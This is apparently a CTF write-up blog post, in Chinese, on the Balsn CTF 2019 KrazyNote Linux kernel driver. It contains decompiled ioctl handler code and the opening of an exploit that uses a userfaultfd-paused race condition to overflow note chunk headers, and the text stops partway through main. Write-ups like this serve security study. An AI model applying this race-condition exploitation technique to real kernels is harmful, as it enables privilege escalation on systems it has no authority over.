@@ -1,0 +1,424 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Balsn_CTF_2019-KrazyNote-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识"><meta property="og:image" content><meta property="og:title" content="Balsn_CTF_2019-KrazyNote-WP"><meta property="og:description" content="这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1480.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-19T20:57:00+00:00"><meta property="article:modified_time" content="2021-07-19T20:57:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Balsn_CTF_2019-KrazyNote-WP"><meta name=twitter:description content="这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>Balsn_CTF_2019-KrazyNote-WP</h1><div class=meta>Posted on Jul 19, 2021</div></div><section class=body><p>这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识到有必要提高一下逆向水平。</p><p>此题注册了一个驱动，只有一个 ioctl 操作，在其中实现了一个增删查改的笔记管理器。比较特殊的有三点</p><ol><li>笔记存储时进行了异或加密，不仅使我们的 leak 变得麻烦，更使代码变得恶心了许多</li><li>自己实现了一个简单的内存管理系统用于笔记的内存分配</li><li>ioctl 为 unlocked_ioctl，这代表内核并不会保证 ioctl 的线程同步，而驱动对 ioctl 的实现也没有加入同步原语，这代表 ioctl 可能可以发生条件竞争。</li></ol><h3 id=分析流程>分析流程</h3><p>用户传入的结构体为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserArg</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> idx;
+</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int8</span> size;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>content;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>内部存储笔记的结构体为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>NOTE</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int8</span> size;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> offset;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> content[size];
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>然后看一下各个操作，首先是 add 操作</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( (_DWORD)cmd <span style=color:#666>!=</span> <span style=color:#40a070>0xFFFFFF00</span> )            <span style=color:#60a0b0;font-style:italic>// add; cmd == 0xFFFFFF00
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>      <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>25LL</span>;
+</span></span><span style=display:flex><span>    user_arg.idx <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1LL</span>;
+</span></span><span style=display:flex><span>    idx_iter <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> ( <span style=color:#40a070>1</span> )                                 <span style=color:#60a0b0;font-style:italic>// find an unused place
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    {
+</span></span><span style=display:flex><span>      unused_idx <span style=color:#666>=</span> (<span style=color:#902000>int</span>)idx_iter;
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>!</span>note_arr[idx_iter] )
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>;
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>++</span>idx_iter <span style=color:#666>==</span> <span style=color:#40a070>16</span> )
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>14LL</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    head_ptr <span style=color:#666>=</span> note_buf_ptr;
+</span></span><span style=display:flex><span>    user_arg.idx <span style=color:#666>=</span> unused_idx;
+</span></span><span style=display:flex><span>    note_arr[unused_idx] <span style=color:#666>=</span> note_buf_ptr;
+</span></span><span style=display:flex><span>    <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>head_ptr<span style=color:#666>-&gt;</span>size <span style=color:#666>=</span> user_arg_size;
+</span></span><span style=display:flex><span>    content_ptr <span style=color:#666>=</span> head_ptr <span style=color:#666>+</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>    head_ptr<span style=color:#666>-&gt;</span>xor_encrypt_key <span style=color:#666>=</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)(<span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)(__readgsqword((<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)<span style=color:#666>&amp;</span>current_task) <span style=color:#666>+</span> <span style=color:#40a070>2024</span>) <span style=color:#666>+</span> <span style=color:#40a070>80LL</span>);
+</span></span><span style=display:flex><span>    new_size <span style=color:#666>=</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>user_arg.size;
+</span></span><span style=display:flex><span>    user_buf <span style=color:#666>=</span> user_arg.content;
+</span></span><span style=display:flex><span>    note_buf_ptr <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>NOTE</span> <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)head_ptr <span style=color:#666>+</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>user_arg.size <span style=color:#666>+</span> <span style=color:#40a070>24</span>);<span style=color:#60a0b0;font-style:italic>// update note_buf_ptr
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>user_arg.size <span style=color:#666>&gt;</span> <span style=color:#40a070>256uLL</span> )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      _warn_printk(<span style=color:#4070a0>&#34;Buffer overflow detected (%d &lt; %lu)!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#40a070>256LL</span>, <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>user_arg.size);
+</span></span><span style=display:flex><span>      BUG();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    _check_object_size(src, <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>user_arg.size, <span style=color:#40a070>0LL</span>);
+</span></span><span style=display:flex><span>    copy_from_user(src, user_buf, new_size);
+</span></span><span style=display:flex><span>    v25 <span style=color:#666>=</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>user_arg.size;
+</span></span><span style=display:flex><span>    v26 <span style=color:#666>=</span> note_arr[user_arg.idx];
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>user_arg.size )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      v27 <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>do</span>
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        src[v27 <span style=color:#666>/</span> <span style=color:#40a070>8</span>] <span style=color:#666>^=</span> v26<span style=color:#666>-&gt;</span>xor_encrypt_key;
+</span></span><span style=display:flex><span>        v27 <span style=color:#666>+=</span> <span style=color:#40a070>8LL</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>while</span> ( v27 <span style=color:#666>&lt;</span> v25 );
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    memcpy(content_ptr, src, v25);
+</span></span><span style=display:flex><span>    result <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>    v26<span style=color:#666>-&gt;</span>offset <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>__int64</span>)content_ptr <span style=color:#666>-</span> page_offset_base;
+</span></span></code></pre></div><p>这里比较乱，实际上做的事情还是比较简单的，就是将用户传入的字符串与加密密钥异或后拷贝到内核中 <code>note_arr[idx].content</code> 中</p><p>edit 操作</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ( (_DWORD)cmd <span style=color:#666>==</span> <span style=color:#40a070>0xFFFFFF01</span> )              <span style=color:#60a0b0;font-style:italic>// edit; cmd == 0xFFFFFF01
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  {
+</span></span><span style=display:flex><span>    note <span style=color:#666>=</span> note_arr[idx];
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( note )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      size <span style=color:#666>=</span> note<span style=color:#666>-&gt;</span>size;
+</span></span><span style=display:flex><span>      user_content <span style=color:#666>=</span> user_arg.content;
+</span></span><span style=display:flex><span>      address <span style=color:#666>=</span> (_QWORD <span style=color:#666>*</span>)(note<span style=color:#666>-&gt;</span>offset <span style=color:#666>+</span> page_offset_base);
+</span></span><span style=display:flex><span>      _check_object_size(src, size, <span style=color:#40a070>0LL</span>);
+</span></span><span style=display:flex><span>      copy_from_user(src, user_content, size);
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( size )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        v19 <span style=color:#666>=</span> note_arr[user_arg.idx];
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> ( i <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>; i <span style=color:#666>&lt;</span> size; i <span style=color:#666>+=</span> <span style=color:#40a070>8LL</span> )
+</span></span><span style=display:flex><span>          src[i <span style=color:#666>/</span> <span style=color:#40a070>8</span>] <span style=color:#666>^=</span> v19<span style=color:#666>-&gt;</span>xor_encrypt_key;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> ( (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size <span style=color:#666>&gt;=</span> <span style=color:#40a070>8</span> )
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>          <span style=color:#666>*</span>address <span style=color:#666>=</span> src[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>          <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)address <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size <span style=color:#666>-</span> <span style=color:#40a070>8</span>) <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#007020;font-weight:700>__int64</span> <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>src[<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size);
+</span></span><span style=display:flex><span>          result <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>          qmemcpy(
+</span></span><span style=display:flex><span>            (<span style=color:#902000>void</span> <span style=color:#666>*</span>)((<span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>)(address <span style=color:#666>+</span> <span style=color:#40a070>1</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFFFFFFFFF8LL</span>),
+</span></span><span style=display:flex><span>            (<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>void</span> <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)src <span style=color:#666>-</span> ((<span style=color:#902000>char</span> <span style=color:#666>*</span>)address <span style=color:#666>-</span> ((<span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>)(address <span style=color:#666>+</span> <span style=color:#40a070>1</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFFFFFFFFF8LL</span>))),
+</span></span><span style=display:flex><span>            <span style=color:#40a070>8LL</span> <span style=color:#666>*</span> (((<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size <span style=color:#666>+</span> (_DWORD)address <span style=color:#666>-</span> (((_DWORD)address <span style=color:#666>+</span> <span style=color:#40a070>8</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFF8</span>)) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>3</span>));
+</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>return</span> result;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( (size <span style=color:#666>&amp;</span> <span style=color:#40a070>4</span>) <span style=color:#666>!=</span> <span style=color:#40a070>0</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#666>*</span>(_DWORD <span style=color:#666>*</span>)address <span style=color:#666>=</span> src[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>        <span style=color:#666>*</span>(_DWORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)address <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size <span style=color:#666>-</span> <span style=color:#40a070>4</span>) <span style=color:#666>=</span> <span style=color:#666>*</span>(_DWORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)src <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( (_DWORD)size )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#666>*</span>(_BYTE <span style=color:#666>*</span>)address <span style=color:#666>=</span> src[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> ( (size <span style=color:#666>&amp;</span> <span style=color:#40a070>2</span>) <span style=color:#666>!=</span> <span style=color:#40a070>0</span> )
+</span></span><span style=display:flex><span>          <span style=color:#666>*</span>(_WORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)address <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size <span style=color:#666>-</span> <span style=color:#40a070>2</span>) <span style=color:#666>=</span> <span style=color:#666>*</span>(_WORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)src <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)size <span style=color:#666>-</span> <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>  }
+</span></span></code></pre></div><p>和 add 差不多</p><p>show 操作就是把数据通过密钥解密后拷贝到用户态</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>    v10 <span style=color:#666>=</span> note_arr[idx];                        <span style=color:#60a0b0;font-style:italic>// show; cmd == 0xFFFFFF02
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    result <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( v10 )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      v11 <span style=color:#666>=</span> v10<span style=color:#666>-&gt;</span>size;
+</span></span><span style=display:flex><span>      v12 <span style=color:#666>=</span> (_DWORD <span style=color:#666>*</span>)(v10<span style=color:#666>-&gt;</span>offset <span style=color:#666>+</span> page_offset_base);
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)v11 <span style=color:#666>&gt;=</span> <span style=color:#40a070>8</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#666>*</span>(<span style=color:#007020;font-weight:700>__int64</span> <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>src[<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#666>+</span> v10<span style=color:#666>-&gt;</span>size) <span style=color:#666>=</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)v12 <span style=color:#666>+</span> v10<span style=color:#666>-&gt;</span>size <span style=color:#666>-</span> <span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span>        qmemcpy(src, v12, <span style=color:#40a070>8LL</span> <span style=color:#666>*</span> ((<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)(v11 <span style=color:#666>-</span> <span style=color:#40a070>1</span>) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>3</span>));
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>else</span> <span style=color:#06287e>if</span> ( (v11 <span style=color:#666>&amp;</span> <span style=color:#40a070>4</span>) <span style=color:#666>!=</span> <span style=color:#40a070>0</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        LODWORD(src[<span style=color:#40a070>0</span>]) <span style=color:#666>=</span> <span style=color:#666>*</span>v12;
+</span></span><span style=display:flex><span>        <span style=color:#666>*</span>(_DWORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)src <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)v11 <span style=color:#666>-</span> <span style=color:#40a070>4</span>) <span style=color:#666>=</span> <span style=color:#666>*</span>(_DWORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)v12 <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)v11 <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>else</span> <span style=color:#06287e>if</span> ( v10<span style=color:#666>-&gt;</span>size )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        LOBYTE(src[<span style=color:#40a070>0</span>]) <span style=color:#666>=</span> <span style=color:#666>*</span>(_BYTE <span style=color:#666>*</span>)v12;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> ( (v11 <span style=color:#666>&amp;</span> <span style=color:#40a070>2</span>) <span style=color:#666>!=</span> <span style=color:#40a070>0</span> )
+</span></span><span style=display:flex><span>          <span style=color:#666>*</span>(_WORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)src <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)v11 <span style=color:#666>-</span> <span style=color:#40a070>2</span>) <span style=color:#666>=</span> <span style=color:#666>*</span>(_WORD <span style=color:#666>*</span>)((<span style=color:#902000>char</span> <span style=color:#666>*</span>)v12 <span style=color:#666>+</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>)v11 <span style=color:#666>-</span> <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( v11 )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> ( j <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>; j <span style=color:#666>&lt;</span> v11; j <span style=color:#666>+=</span> <span style=color:#40a070>8LL</span> )
+</span></span><span style=display:flex><span>          src[j <span style=color:#666>/</span> <span style=color:#40a070>8</span>] <span style=color:#666>^=</span> v10<span style=color:#666>-&gt;</span>xor_encrypt_key;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      v14 <span style=color:#666>=</span> user_arg.content;
+</span></span><span style=display:flex><span>      _check_object_size(src, v11, <span style=color:#40a070>1LL</span>);
+</span></span><span style=display:flex><span>      copy_to_user(v14, src, v11);
+</span></span><span style=display:flex><span>      result <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span></code></pre></div><p>还有一个 clear_all 操作可以清空所有的 chunk</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> ( (_DWORD)cmd <span style=color:#666>!=</span> <span style=color:#40a070>0xFFFFFF02</span> )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      v6 <span style=color:#666>=</span> note_arr;
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( (_DWORD)cmd <span style=color:#666>==</span> <span style=color:#40a070>0xFFFFFF03</span> )          <span style=color:#60a0b0;font-style:italic>// clear all; cmd == 0xFFFFFF03
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>      {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>do</span>
+</span></span><span style=display:flex><span>          <span style=color:#666>*</span>v6<span style=color:#666>++</span> <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>while</span> ( <span style=color:#666>&amp;</span>_check_object_size <span style=color:#666>!=</span> (<span style=color:#007020;font-weight:700>__int64</span> (<span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#666>**</span>)(_QWORD, _QWORD, _QWORD))v6 );<span style=color:#60a0b0;font-style:italic>// reach the end of the note_arr
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>        result <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
+</span></span><span style=display:flex><span>        note_buf_ptr <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>NOTE</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>note_buf;
+</span></span><span style=display:flex><span>        memset(<span style=color:#666>&amp;</span>note_buf, <span style=color:#40a070>0</span>, <span style=color:#40a070>0x2000uLL</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> result;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>25LL</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><h3 id=利用>利用</h3><p>考虑到 ioctl 自身可以发生条件竞争，那么考虑在 edit 操作中，在 copy_from_user 时通过 userfaultfd 暂停此线程，此时释放掉原先被 edit 的 chunk，再申请一个更小的 chunk 到原先的 chunk 位置上，这样 userfaultfd 结束后，edit 操作就出现了溢出，可以对后方的 chunk 头部字段进行修改。</p><p>具体的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>char</span> buf_null[<span style=color:#40a070>0x200</span>], buf_content[<span style=color:#40a070>0x200</span>];  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>comp_thread</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>    puts(<span style=color:#4070a0>&#34;[+] comp start&#34;</span>);
+</span></span><span style=display:flex><span>    note_clear_all();
+</span></span><span style=display:flex><span>    note_add(<span style=color:#40a070>0</span>, buf_null);
+</span></span><span style=display:flex><span>    note_add(<span style=color:#40a070>0x10</span>, buf_null);
+</span></span><span style=display:flex><span>    note_add(<span style=color:#40a070>0x10</span>, buf_null);
+</span></span><span style=display:flex><span>    puts(<span style=color:#4070a0>&#34;[+] comp done!&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    note_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/note&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (note_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        err_exit(<span style=color:#4070a0>&#34;open note failed!&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    note_add(<span style=color:#40a070>0x10</span>, buf_null); <span style=color:#60a0b0;font-style:italic>// idx: 0
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span><span style=color:#666>*</span> sleep3_memA <span style=color:#666>=</span> mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (sleep3_memA <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        err_exit(<span style=color:#4070a0>&#34;mmap failed!&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    register_userfault(sleep3_memA, userfaultfd_sleep3_edit_handler);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    pthread_t thr;
+</span></span><span style=display:flex><span>    pthread_create(<span style=color:#666>&amp;</span>thr, <span style=color:#007020>NULL</span>, comp_thread, <span style=color:#007020>NULL</span>);
+</span></span><span style=display:flex><span>    note_edit(<span style=color:#40a070>0</span>, sleep3_memA);
